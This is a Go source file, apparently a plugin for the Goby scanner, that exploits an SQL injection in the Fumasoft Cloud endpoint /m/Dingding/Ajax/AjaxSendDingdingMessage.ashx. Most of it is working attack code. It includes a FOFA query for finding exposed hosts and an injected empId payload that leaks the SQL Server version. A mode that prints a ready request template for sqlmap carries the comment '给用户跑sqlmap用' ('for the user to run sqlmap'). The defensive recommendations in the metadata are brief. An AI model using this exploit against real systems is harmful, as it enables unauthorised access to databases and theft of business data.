package exploits

import (
	"errors"
	"regexp"
	"strings"
	"fmt"

	"strconv"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Fumasoft Cloud /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx SQL Injection Vulnerability",
    "Description": "<p>Shanghai Fuma Software Co. is a foreign trade SaaS service provider, but also a professional foreign trade industry solutions provider. The new VUMA cloud products, so that users can use the cloud model to achieve information management, so that the user's off-site office more smoothly, greatly reducing the cost of small and medium-sized enterprises in the information technology, with the minimum investment to enjoy the level of information technology services of large enterprises, so that small and medium-sized enterprises in the network hardware environment, the management of the internal trade process and the rapid clearance to form a complete set of solutions.</p>",
    "Product": "Fuma_Soft-Cloud",
    "Homepage": "https://www.fumasoft.com/",
    "DisclosureDate": "2024-02-05",
    "PostTime": "2024-08-01",
    "Author": "zhangjingpei@baimaohui.net",
    "FofaQuery": "body=\"hidLicResult\" && body=\"hidProductID\"",
    "GobyQuery": "body=\"hidLicResult\" && body=\"hidProductID\"",
    "Level": "2",
    "Impact": "<p>which could lead to SQL injection attacks. An attacker can gain unauthorised access to the database through this vulnerability, resulting in a potential risk of information leakage.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.fumasoft.com/\">https://www.fumasoft.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls. </p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "2'+and+1=@@VERSION--+",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "孚盟云 /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx SQL 注入漏洞",
            "Product": "孚盟软件-孚盟云",
            "Description": "<p>上海孚盟软件有限公司是一家外贸SaaS服务提供商，也是专业的外贸行业解决方案专业提供商。 全新的孚盟云产品，让用户可以用云模式实现信息化管理，让用户的异地办公更加流畅，大大降低中小企业在信息化上成本，用最小的投入享受大型企业级别的信息化服务，使中小企业在网络硬件环境、内部贸易过程管理与快速通关形成一套完整解决方案。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/\"></a><a href=\"https://www.fumasoft.com/\">https://www.fumasoft.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;&nbsp;&nbsp;</p><p>3、如非必要，禁⽌公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过此漏洞未经授权地访问数据库，造成潜在的信息泄露风险。建议尽快修复漏洞，强化输入验证，提升系统安全性。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Fumasoft Cloud /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx SQL Injection Vulnerability",
            "Product": "Fuma_Soft-Cloud",
            "Description": "<p>Shanghai Fuma Software Co.&nbsp;is a foreign trade SaaS service provider, but also a professional foreign trade industry solutions provider. The new VUMA cloud products, so that users can use the cloud model to achieve information management, so that the user's off-site office more smoothly, greatly reducing the cost of small and medium-sized enterprises in the information technology, with the minimum investment to enjoy the level of information technology services of large enterprises, so that small and medium-sized enterprises in the network hardware environment, the management of the internal trade process and the rapid clearance to form a complete set of solutions.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.fumasoft.com/\">https://www.fumasoft.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.&nbsp;</p><p>3. Keep the system off the public web if it is not necessary.<br></p>",
            "Impact": "<p>which could lead to SQL injection attacks. An attacker can gain unauthorised access to the database through this vulnerability, resulting in a potential risk of information leakage.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10984"
}`

	sendInitialPayload_xpUyibi90 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		url := `/m/Dingding/Ajax/AjaxSendDingdingMessage.ashx`
		body := "action=SendDingMeg_Mail&empId=" + sql
		header := map[string]string{
			"User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
			"Accept-Encoding":  "gzip, deflate, br",
			"Accept-Language":  "zh-CN,zh;q=0.9",
			"Connection":       "close",
			"Content-Type":     "application/x-www-form-urlencoded",
			"X-Requested-With": "XMLHttpRequest",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendInitialPayload_xpUyibi90
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			// sql := "CHAR(113,112,106,113,113)"
			sql := "2'+and+1=@@VERSION--+"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			//检测逻辑
			// re := regexp.MustCompile(`"([^"]+)":\[\{"date":`)
			// // 查找第一个匹配项
			// match := re.FindStringSubmatch(resp.Utf8Html)
			// // 如果找到了匹配项，返回第一个捕获组的内容
			// if len(match) < 1 {
			// 	return false
			// }
			if !strings.Contains(resp.Utf8Html, "nvarchar") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/m/Dingding/Ajax/AjaxSendDingdingMessage.ashx`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendInitialPayload_xpUyibi90
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams 检查前面是否设置相关参数
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 查找第一个匹配项
				// re := regexp.MustCompile(`'([^']*)'`)
				// match := re.FindStringSubmatch(resp.Utf8Html)
				// if len(match) < 1 {
				// 	//正则失败
				// 	expResult.Output = `Exploitation failed.`
				// 	expResult.Success = false
				// 	return expResult
				// }

				re := regexp.MustCompile(`'([^']*)'`)
				match := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}

				result := ""
				if len(match) > 0 {
					// 取第一个匹配
					matchedString := match[0][1]
					fmt.Printf("Matched String: %s\n", matchedString)
					
					// 反转义字符串
					unescapedString, err := strconv.Unquote(`"` + matchedString + `"`)
					if err != nil {
						expResult.Output = `Exploitation failed.`
						expResult.Success = false
						return expResult
					}
					fmt.Printf("Unescaped String: %s\n", unescapedString)
					result = unescapedString
				}
				
				// result := strings.Split(re.FindStringSubmatch(resp.Utf8Html)[1], ",")

				expResult.Success = true
				// expResult.Output = `The key points you need to extract is : ` + value
				// expResult.Output = match[1]
				expResult.Output = result
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用
				expResult.Success = true
				expResult.Output = `POST /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Content-Length: 51
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

action=SendDingMeg_Mail&empId=*
`
				return expResult

			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
